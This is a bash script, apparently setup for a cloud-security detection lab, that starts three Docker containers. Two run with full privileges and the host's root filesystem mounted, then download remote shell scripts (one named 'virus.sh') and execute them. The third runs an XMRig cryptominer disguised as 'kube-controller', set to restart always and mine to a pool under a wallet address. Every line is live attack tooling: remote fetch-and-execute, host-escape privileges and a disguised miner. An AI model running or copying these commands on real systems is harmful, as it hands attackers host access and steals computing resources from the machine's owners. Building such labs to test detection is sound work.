#!/bin/bash

# Create and run `malicous-container`
docker run -d --name malicous-container \
  --privileged \
  --cap-add=SYS_ADMIN --cap-add=NET_ADMIN \
  -v /:/host \
  alpine:latest \
  sh -c "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && \
  chmod +x virus.sh && \
  sh virus.sh && \
  sleep 3600"

# Create and run `atk-ttp-test-runner`
docker run -d --name atk-ttp-test-runner \
  --privileged \
  --cap-add=SYS_ADMIN --cap-add=NET_ADMIN \
  -v /:/host \
  alpine:latest \
  sh -c "wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-test.sh -O atk-ttp-test.sh && \
  chmod +x atk-ttp-test.sh && \
  ./atk-ttp-test.sh && \
  sleep 3600"

# Create and run crytominer that act as 'kube-controller'
  docker run -d --name kube-controller \
  --privileged \
  --restart=always \
  metal3d/xmrig \
  sh -c "/xmrig/xmrig --donate-level 0 -o ca.minexmr.com:443 -u 41pdpXWNMe6NvuDASWXn6ZMdPk4N6amucCHHstNcw2y8caJNdgN4kNeW3QFfc3amCiJ9x6dh8pLboR6minjYZpgk1szkeGg -k --tls >/dev/null 2>/dev/null"
